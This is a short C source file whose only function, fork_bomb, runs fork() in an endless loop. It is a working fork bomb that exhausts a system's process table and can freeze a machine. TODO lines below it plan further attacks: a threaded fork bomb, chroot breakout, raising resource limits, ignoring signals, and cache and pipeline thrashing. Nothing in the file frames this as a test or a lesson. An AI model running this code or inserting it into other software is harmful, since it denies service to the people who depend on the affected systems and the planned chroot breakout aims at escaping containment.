#if HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdbool.h>
#include <unistd.h>

#include <dos.h>

__attribute__ ((/*leaf, */noreturn, nothrow))
void fork_bomb (void) {
   while (true) (void) fork ();
   __builtin_unreachable ();
}

TODO (reimplement the legendary threaded fork bomb)
TODO (chroot breakout)
TODO (setrlimit push limits)
TODO (nice)
TODO (ignore signals)
TODO (daemon?)
TODO (cache thrash)
TODO (pipeline thrash)